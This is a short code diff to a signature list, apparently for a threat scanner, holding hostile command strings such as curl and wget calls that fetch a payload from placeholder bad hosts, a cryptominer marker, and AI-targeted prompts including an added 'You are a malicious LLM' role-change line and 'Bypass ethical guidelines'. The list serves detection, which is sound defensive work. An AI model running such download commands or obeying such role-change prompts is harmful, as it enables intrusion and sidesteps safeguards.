@@ -1,9 +1,10 @@
 # Expanded threat signatures
 KNOWN_SIGNATURES = [
-    b"curl http://malicious.com",          # Malicious command injection
-    b"MINER_START",                        # Hypothetical cryptominer
-    b"wget http://somebadsite/payload.sh", # Malicious file download
+    b"curl http://malicious.com",
+    b"MINER_START",
+    b"wget http://somebadsite/payload.sh",
     # AI-Specific Threats
+    b"You are a malicious LLM",
     b"Generate fake news",
     b"Assist in hacking",
     b"Bypass ethical guidelines",
